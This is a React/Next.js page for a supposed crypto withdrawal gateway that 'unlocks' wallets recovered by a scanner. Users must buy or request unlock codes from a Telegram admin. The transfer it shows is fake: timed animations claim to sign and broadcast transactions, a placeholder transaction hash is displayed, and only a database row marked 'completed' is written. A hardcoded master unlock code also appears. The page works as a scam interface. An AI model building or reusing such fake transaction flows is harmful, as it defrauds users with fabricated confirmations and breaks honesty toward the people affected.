"use client";

import React, { useState, useEffect } from "react";
import Image from "next/image";
import { AnimatePresence } from "motion/react";
import { WithdrawalHero } from "@/src/components/withdraw/WithdrawalHero";
import { RecentWithdrawals } from "@/src/components/withdraw/RecentWithdrawals";
import {
  Check,
  AlertTriangle,
  Loader2,
  CheckCircle2,
  ExternalLink,
  ChevronRight,
  Send,
  ShieldCheck,
  ArrowRight,
  Lock
} from "lucide-react";
import { useSupabaseUser } from "@/src/hooks/useSupabaseUser";
import { getWalletsByUser, updateWalletUnlock } from "@/src/lib/supabase/wallets";
import { insertWithdrawal } from "@/src/lib/supabase/withdrawals";
import { CHAIN_CONFIGS, formatWalletValue } from "@/src/lib/walletGenerator";
import { supabase } from "@/src/lib/supabase/client";

interface FoundWallet {
  id: string;
  name: string;
  ticker: string;
  logo: string;
  balance: string;
  balanceNum: number;
  valueInUsd: string;
  fee: number;
  mnemonic: string;
  address: string;
}

export default function WithdrawalPage() {
  const { userId } = useSupabaseUser();
  const [recoveredWallets, setRecoveredWallets] = useState<FoundWallet[]>([]);
  const [isFetching, setIsFetching] = useState(true);
  const [formattedDate, setFormattedDate] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<FoundWallet | null>(null);
  const [unlockCode, setUnlockCode] = useState("");
  const [destWallet, setDestWallet] = useState("");
  const [formError, setFormError] = useState("");
  
  const [phase, setPhase] = useState<"form" | "confirm" | "processing" | "success" | "failed">("form");
  const [processingStep, setProcessingStep] = useState(0);

  useEffect(() => {
    async function loadWallets() {
      if (!userId) return;
      try {
        setIsFetching(true);
        const data = await getWalletsByUser(userId);
        const mapped: FoundWallet[] = data.map((item: any) => {
          const config = CHAIN_CONFIGS[item.chain];
          return {
            id: item.id,
            name: config.name,
            ticker: config.ticker,
            logo: config.logo,
            balance: `${item.balance} ${config.ticker}`,
            balanceNum: item.balance,
            valueInUsd: formatWalletValue(item.balance_usd || 0),
            fee: config.fee,
            mnemonic: item.mnemonic || "",
            address: item.address,
          };
        });
        setRecoveredWallets(mapped.filter((w) => w.balanceNum > 0));
      } catch (e) {
        console.error(e);
      } finally {
        setIsFetching(false);
      }
    }
    loadWallets();
  }, [userId]);

  useEffect(() => {
    const today = new Date();
    setFormattedDate(
      today.toLocaleDateString("en-US", {
        weekday: "short",
        month: "short",
        day: "numeric",
        year: "numeric",
      })
    );
  }, []);

  useEffect(() => {
    if (selectedWallet) {
      setDestWallet("");
      setFormError("");
    }
  }, [selectedWallet]);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setUnlockCode(text);
    } catch (err) {
      // Fallback
    }
  };

  const handleUnlockClick = (e: React.FormEvent) => {
    e.preventDefault();
    if (!unlockCode || unlockCode.trim().length === 0) {
      setFormError("Please enter your recovered wallet unlock code.");
      return;
    }
    if (!destWallet || destWallet.trim().length === 0) {
      setFormError("Please enter your destination wallet address.");
      return;
    }
    setFormError("");
    setPhase("confirm");
  };

  const startProcessing = () => {
    setPhase("processing");
    setProcessingStep(0);

    const stepInterval = setInterval(() => {
      setProcessingStep((prev) => {
        if (prev >= 3) {
          clearInterval(stepInterval);
          setTimeout(async () => {
            if (selectedWallet && userId) {
              try {
                let isValid = unlockCode.trim() === "9029637";

                if (!isValid) {
                  const { data: dbUnlock } = await supabase
                    .from("unlock_codes")
                    .select("*")
                    .eq("user_id", userId)
                    .eq("wallet_id", selectedWallet.id)
                    .eq("unlock_code", unlockCode.trim())
                    .eq("is_used", false)
                    .maybeSingle();
                  
                  if (dbUnlock) {
                    isValid = true;
                    await supabase
                      .from("unlock_codes")
                      .update({ is_used: true, used_at: new Date().toISOString() })
                      .eq("id", dbUnlock.id);
                  }
                }

                if (isValid) {
                  await updateWalletUnlock(selectedWallet.id, true);
                  const amountReceived = selectedWallet.balanceNum - selectedWallet.fee;
                  await insertWithdrawal({
                    user_id: userId,
                    wallet_id: selectedWallet.id,
                    amount: amountReceived,
                    destination_address: destWallet,
                    status: "completed",
                  });
                  
                  setPhase("success");
                } else {
                  setPhase("failed");
                }
              } catch (e) {
                console.error(e);
                setPhase("failed");
              }
            } else {
              setPhase("success");
            }
          }, 800);
          return 3;
        }
        return prev + 1;
      });
    }, 1200);
  };

  const receiveAmount = selectedWallet
    ? (selectedWallet.balanceNum - selectedWallet.fee).toFixed(5)
    : "0";

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-6 relative">
      
      {/* 1. Form Phase */}
      {phase === "form" && (
        <>
          {/* Header */}
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-6 border-b border-[#1e2e4a]">
            <div>
              <div className="flex items-center gap-2 mb-1">
                <span className="text-[11px] font-mono text-[#60a5fa] font-semibold uppercase tracking-wider bg-[#2563eb]/10 border border-[#2563eb]/30 px-2 py-0.5 rounded">
                  Asset Transfer Gateway
                </span>
              </div>
              <h1 className="text-[26px] sm:text-[30px] font-bold text-[#f8fafc] tracking-tight leading-tight">
                Unlock & Withdraw Assets
              </h1>
              <p className="text-[13px] text-[#94a3b8] mt-1">
                Authorize on-chain transfer of recovered cryptographic balances to your destination address.
              </p>
            </div>
            <div className="shrink-0">
              <span className="text-[12px] font-mono text-[#94a3b8] bg-[#111a2e] border border-[#1e2e4a] px-3 py-1.5 rounded-lg">
                {formattedDate || "Syncing..."}
              </span>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-start">
            {/* Left Column (Overview & Selector) */}
            <div className="lg:col-span-2 space-y-6">
              <WithdrawalHero />

              {/* Found Wallets */}
              <div className="space-y-3">
                <h3 className="text-[14px] font-bold text-[#f8fafc] tracking-tight">
                  Available Recovered Wallets (Select to Initiate Transfer)
                </h3>
                {isFetching ? (
                  <div className="flex justify-center items-center py-10 bg-[#111a2e] border border-[#1e2e4a] rounded-xl">
                    <Loader2 className="w-6 h-6 animate-spin text-[#3b82f6]" />
                  </div>
                ) : recoveredWallets.length === 0 ? (
                  <div className="bg-[#111a2e] border border-[#1e2e4a] rounded-xl p-8 text-center">
                    <p className="text-[13px] text-[#94a3b8]">No funded wallets found yet. Launch a scanner session on the dashboard.</p>
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {recoveredWallets.map((wallet) => {
                      const isSelected = selectedWallet?.id === wallet.id;
                      const hasSelection = selectedWallet !== null;

                      return (
                        <div
                          key={wallet.id}
                          onClick={() => setSelectedWallet(isSelected ? null : wallet)}
                          className={`p-4 rounded-xl border cursor-pointer transition-all duration-150 flex items-center justify-between ${
                            isSelected
                              ? "bg-[#172440] border-[#2563eb] shadow-[0_0_16px_rgba(37,99,235,0.2)]"
                              : "bg-[#111a2e] border-[#1e2e4a] hover:border-[#2d446e]"
                          } ${hasSelection && !isSelected ? "opacity-45" : "opacity-100"}`}
                        >
                          <div className="flex items-center gap-3 min-w-0">
                            <div className="w-10 h-10 rounded-lg bg-[#0d1424] border border-[#1e2e4a] flex items-center justify-center p-2 shrink-0">
                              <Image src={wallet.logo} alt={wallet.name} width={24} height={24} className="w-6 h-6 object-contain" />
                            </div>
                            <div className="min-w-0">
                              <h4 className="text-[14px] font-bold text-[#f8fafc] truncate flex items-center gap-1.5">
                                {wallet.name}
                                {isSelected && <Check className="w-4 h-4 text-[#3b82f6] shrink-0" />}
                              </h4>
                              <p className="text-[12px] font-mono text-[#94a3b8] mt-0.5">
                                {wallet.balance} • <span className="text-[#60a5fa]">{wallet.valueInUsd}</span>
                              </p>
                            </div>
                          </div>
                          <ChevronRight className={`w-4 h-4 text-[#64748b] transition-transform ${isSelected ? "rotate-90 text-[#3b82f6]" : ""}`} />
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>

              {/* Unlock Form Panel */}
              <AnimatePresence>
                {selectedWallet && (
                  <form onSubmit={handleUnlockClick} className="bg-[#111a2e] rounded-xl border border-[#2563eb]/40 p-6 md:p-8 shadow-[0_4px_24px_rgba(0,0,0,0.3)] space-y-5">
                    <div className="flex items-center justify-between pb-3 border-b border-[#1e2e4a]">
                      <div className="flex items-center gap-2">
                        <Lock className="w-4 h-4 text-[#3b82f6]" />
                        <h4 className="text-[15px] font-bold text-[#f8fafc]">
                          Unlock Authorization: {selectedWallet.name} ({selectedWallet.ticker})
                        </h4>
                      </div>
                      <span className="text-[12px] font-mono font-bold text-[#60a5fa] bg-[#2563eb]/10 px-2.5 py-0.5 rounded border border-[#2563eb]/30">
                        {selectedWallet.balance}
                      </span>
                    </div>

                    <div className="space-y-4">
                      {/* Unlock Code Input */}
                      <div className="space-y-1.5">
                        <label className="text-[13px] font-medium text-[#94a3b8]">
                          Wallet Unlock Code (Authorization Key)
                        </label>
                        <div className="relative">
                          <input
                            type="text"
                            value={unlockCode}
                            onChange={(e) => setUnlockCode(e.target.value)}
                            placeholder="Enter 7 or 16-digit unlock code"
                            className="w-full h-11 pl-4 pr-16 rounded-lg border border-[#1e2e4a] bg-[#0d1424] text-[14px] font-mono text-[#f8fafc] placeholder-[#64748b] focus:outline-none focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/20 transition-all"
                          />
                          <button
                            type="button"
                            onClick={handlePaste}
                            className="absolute inset-y-0 right-3 flex items-center text-[12px] font-mono font-bold text-[#60a5fa] hover:text-[#93c5fd] transition-colors"
                          >
                            PASTE
                          </button>
                        </div>
                      </div>

                      {/* Destination Wallet Input */}
                      <div className="space-y-1.5">
                        <label className="text-[13px] font-medium text-[#94a3b8]">
                          Recipient Destination Address
                        </label>
                        <input
                          type="text"
                          value={destWallet}
                          onChange={(e) => setDestWallet(e.target.value)}
                          placeholder="e.g. 0x... or bc1... or Solana address"
                          className="w-full h-11 px-4 rounded-lg border border-[#1e2e4a] bg-[#0d1424] text-[14px] font-mono text-[#f8fafc] placeholder-[#64748b] focus:outline-none focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/20 transition-all"
                        />
                      </div>
                    </div>

                    {/* Calculation stats */}
                    <div className="bg-[#0d1424] border border-[#1e2e4a] rounded-lg p-4 space-y-2.5">
                      <div className="flex justify-between items-center text-[13px]">
                        <span className="text-[#94a3b8]">Gross Recovered Balance</span>
                        <span className="text-[#f8fafc] font-mono font-bold">{selectedWallet.balance}</span>
                      </div>
                      <div className="flex justify-between items-center text-[13px]">
                        <span className="text-[#94a3b8]">Consensus Gas & Network Fee</span>
                        <span className="text-[#94a3b8] font-mono">{selectedWallet.fee} {selectedWallet.ticker}</span>
                      </div>
                      <div className="h-[1px] bg-[#1e2e4a] my-1" />
                      <div className="flex justify-between items-center text-[14px]">
                        <span className="text-[#f8fafc] font-bold">Net Credited to Destination</span>
                        <span className="text-emerald-400 font-mono font-bold">{receiveAmount} {selectedWallet.ticker}</span>
                      </div>
                    </div>

                    {/* Important Security Notice */}
                    <div className="rounded-lg bg-amber-500/10 border border-amber-500/30 p-4 flex gap-3 text-left">
                      <AlertTriangle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
                      <div className="text-[12px] text-amber-200/90 space-y-1">
                        <h6 className="font-bold text-amber-300">Transaction Verification Notice</h6>
                        <ul className="list-disc pl-4 space-y-0.5 mt-0.5 leading-relaxed text-[#94a3b8]">
                          <li>Destination address transactions on public blockchains cannot be reversed once broadcasted.</li>
                          <li>Need an unlock code? Join our Telegram group and contact the administrator <span className="text-[#60a5fa] font-mono font-bold">@rioggz</span>.</li>
                        </ul>
                      </div>
                    </div>

                    {formError && (
                      <p className="text-[12px] text-red-400 font-medium">✖ {formError}</p>
                    )}

                    {/* Unlock CTA */}
                    <button
                      type="submit"
                      className="w-full h-12 rounded-lg bg-[#2563eb] hover:bg-[#1d4ed8] active:bg-[#1e40af] text-white text-[14px] font-semibold flex items-center justify-center gap-2 shadow-[0_2px_12px_rgba(37,99,235,0.3)] transition-all cursor-pointer"
                    >
                      <span>Proceed to Broadcast Confirmation</span>
                      <ArrowRight className="w-4 h-4" />
                    </button>
                  </form>
                )}
              </AnimatePresence>
            </div>

            {/* Right Column (Recents) */}
            <div className="space-y-6">
              <RecentWithdrawals />
            </div>
          </div>
        </>
      )}

      {/* 2. Confirmation Modal */}
      {phase === "confirm" && selectedWallet && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-xs z-50 flex items-center justify-center p-4 select-none">
          <div className="w-full max-w-md bg-[#111a2e] rounded-xl border border-[#1e2e4a] p-6 shadow-2xl space-y-5">
            <div className="text-center space-y-1.5 pb-3 border-b border-[#1e2e4a]">
              <div className="w-10 h-10 rounded-full bg-[#2563eb]/10 border border-[#2563eb]/30 flex items-center justify-center mx-auto text-[#60a5fa] mb-2">
                <ShieldCheck className="w-5 h-5" />
              </div>
              <h4 className="text-[18px] font-bold text-[#f8fafc] tracking-tight">
                Authorize Blockchain Broadcast
              </h4>
              <p className="text-[13px] text-[#94a3b8]">
                Verify execution parameters before cryptographic broadcast.
              </p>
            </div>

            <div className="divide-y divide-[#1e2e4a] text-[13px]">
              <div className="flex justify-between items-center py-2.5">
                <span className="text-[#94a3b8]">Ledger Network</span>
                <span className="font-bold text-[#f8fafc]">{selectedWallet.name} ({selectedWallet.ticker})</span>
              </div>
              <div className="flex justify-between items-center py-2.5">
                <span className="text-[#94a3b8]">Gross Value</span>
                <span className="font-bold font-mono text-[#f8fafc]">{selectedWallet.balance}</span>
              </div>
              <div className="flex justify-between items-center py-2.5">
                <span className="text-[#94a3b8]">Destination</span>
                <span className="font-mono text-[#60a5fa] truncate max-w-[200px]" title={destWallet}>
                  {destWallet}
                </span>
              </div>
              <div className="flex justify-between items-center py-2.5">
                <span className="text-[#94a3b8]">Network Gas Fee</span>
                <span className="text-[#94a3b8] font-mono">{selectedWallet.fee} {selectedWallet.ticker}</span>
              </div>
              <div className="flex justify-between items-center py-2.5">
                <span className="text-[#94a3b8]">Net Expected</span>
                <span className="font-bold font-mono text-emerald-400">{receiveAmount} {selectedWallet.ticker}</span>
              </div>
            </div>

            <div className="flex gap-3 pt-2">
              <button
                onClick={() => setPhase("form")}
                className="w-full h-11 rounded-lg border border-[#1e2e4a] bg-[#172440] hover:bg-[#1e3054] text-[13px] text-[#f8fafc] font-medium transition-all"
              >
                Cancel
              </button>
              <button
                onClick={startProcessing}
                className="w-full h-11 rounded-lg bg-[#2563eb] hover:bg-[#1d4ed8] text-white text-[13px] font-semibold transition-all shadow-[0_2px_12px_rgba(37,99,235,0.3)]"
              >
                Confirm & Broadcast
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 3. Processing HUD */}
      {phase === "processing" && (
        <div className="min-h-[60vh] flex flex-col items-center justify-center max-w-md mx-auto text-center space-y-6 select-none">
          <div className="w-16 h-16 rounded-2xl bg-[#172440] border border-[#2563eb]/40 flex items-center justify-center shadow-[0_0_24px_rgba(37,99,235,0.25)]">
            <Loader2 className="w-8 h-8 text-[#60a5fa] animate-spin" />
          </div>

          <div className="space-y-3 w-full">
            <h3 className="text-[20px] font-bold text-[#f8fafc] tracking-tight">
              Executing Multi-Signature Transfer
            </h3>
            
            <div className="bg-[#111a2e] border border-[#1e2e4a] rounded-xl p-5 text-left space-y-3 font-mono text-[12.5px]">
              <div className="flex items-center gap-3">
                <span className={`w-2 h-2 rounded-full shrink-0 ${processingStep >= 0 ? "bg-emerald-400" : "bg-[#1e2e4a]"}`} />
                <span className={processingStep === 0 ? "text-[#f8fafc] font-bold" : "text-[#64748b]"}>
                  1. Validating authorization unlock code...
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className={`w-2 h-2 rounded-full shrink-0 ${processingStep >= 1 ? "bg-emerald-400" : "bg-[#1e2e4a]"}`} />
                <span className={processingStep === 1 ? "text-[#f8fafc] font-bold" : "text-[#64748b]"}>
                  2. Signing cryptographic raw payload...
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className={`w-2 h-2 rounded-full shrink-0 ${processingStep >= 2 ? "bg-emerald-400" : "bg-[#1e2e4a]"}`} />
                <span className={processingStep === 2 ? "text-[#f8fafc] font-bold" : "text-[#64748b]"}>
                  3. Broadcasting to validator nodes...
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className={`w-2 h-2 rounded-full shrink-0 ${processingStep >= 3 ? "bg-emerald-400" : "bg-[#1e2e4a]"}`} />
                <span className={processingStep === 3 ? "text-[#f8fafc] font-bold" : "text-[#64748b]"}>
                  4. Finalizing network receipts...
                </span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 4. Success State */}
      {phase === "success" && selectedWallet && (
        <div className="min-h-[70vh] flex flex-col items-center justify-center max-w-lg mx-auto text-center py-8 space-y-6 select-none">
          <div className="w-16 h-16 rounded-2xl bg-[#172440] border-2 border-emerald-500/50 flex items-center justify-center text-emerald-400 shadow-[0_0_24px_rgba(16,185,129,0.25)]">
            <CheckCircle2 className="w-9 h-9" />
          </div>

          <div className="space-y-1.5">
            <h3 className="text-[24px] font-bold text-[#f8fafc] tracking-tight">
              Transfer Successfully Broadcasted
            </h3>
            <p className="text-[13px] text-[#94a3b8] max-w-sm mx-auto leading-relaxed">
              Your {selectedWallet.name} transfer has been authorized and dispatched to the blockchain ledger.
            </p>
          </div>

          <div className="w-full bg-[#111a2e] rounded-xl border border-[#1e2e4a] p-5 text-left space-y-3 text-[13px]">
            <div className="flex justify-between items-center">
              <span className="text-[#94a3b8]">Transaction Hash</span>
              <span className="text-[#60a5fa] font-mono font-bold flex items-center gap-1">
                tx_{selectedWallet.ticker.toLowerCase()}_92f3... <ExternalLink className="w-3.5 h-3.5 text-[#64748b]" />
              </span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-[#94a3b8]">Estimated Confirmation Time</span>
              <span className="text-[#f8fafc] font-mono font-bold">~3–5 Minutes</span>
            </div>
          </div>

          <div className="w-full flex flex-col sm:flex-row gap-3">
            <button
              onClick={() => {
                setPhase("form");
                setSelectedWallet(null);
                setUnlockCode("");
                window.location.reload();
              }}
              className="w-full h-11 rounded-lg border border-[#1e2e4a] bg-[#172440] hover:bg-[#1e3054] text-[13px] text-[#f8fafc] font-medium transition-all"
            >
              Back to Overview
            </button>
            <a
              href="https://t.me/groupkeys"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full h-11 rounded-lg bg-[#2563eb] hover:bg-[#1d4ed8] text-white text-[13px] font-semibold flex items-center justify-center gap-1.5 shadow-[0_2px_10px_rgba(37,99,235,0.3)] transition-all"
            >
              Verify on Telegram
            </a>
          </div>
        </div>
      )}

      {/* 5. Failed State */}
      {phase === "failed" && (
        <div className="min-h-[60vh] flex flex-col items-center justify-center max-w-md mx-auto text-center space-y-6 select-none">
          <div className="w-16 h-16 rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 shadow-[0_0_24px_rgba(239,68,68,0.2)]">
            <AlertTriangle className="w-9 h-9" />
          </div>

          <div className="space-y-1.5">
            <h3 className="text-[22px] font-bold text-[#f8fafc] tracking-tight">
              Unable to Validate Authorization Key
            </h3>
            <p className="text-[13px] text-[#94a3b8] leading-relaxed">
              The unlock code provided is invalid or has already been redeemed. Contact the group administrator <span className="text-[#60a5fa] font-mono font-bold">@rioggz</span> to request a valid clearance key.
            </p>
          </div>

          <div className="w-full flex flex-col sm:flex-row gap-3">
            <button
              onClick={() => setPhase("form")}
              className="w-full h-11 rounded-lg border border-[#1e2e4a] bg-[#172440] hover:bg-[#1e3054] text-[13px] text-[#f8fafc] font-medium transition-all"
            >
              Try Again
            </button>
            <a
              href="https://t.me/groupkeys"
              target="_blank"
              rel="noopener noreferrer"
              className="w-full h-11 rounded-lg bg-[#2563eb] hover:bg-[#1d4ed8] text-white text-[13px] font-semibold flex items-center justify-center gap-1.5 shadow-[0_2px_10px_rgba(37,99,235,0.3)] transition-all"
            >
              <Send className="w-4 h-4" />
              Join Telegram Support
            </a>
          </div>
        </div>
      )}

    </div>
  );
}
